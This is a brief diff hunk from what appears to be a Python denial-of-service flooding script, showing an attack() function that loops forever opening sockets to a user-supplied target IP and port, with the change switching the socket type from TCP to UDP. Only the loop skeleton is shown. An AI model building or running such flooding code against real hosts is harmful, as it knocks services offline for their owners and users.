@@ -8,7 +8,7 @@ target_port = int(input("Enter Target Port:  "))
 
 def attack():
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         
         s.connect((target_ip, target_port))
         
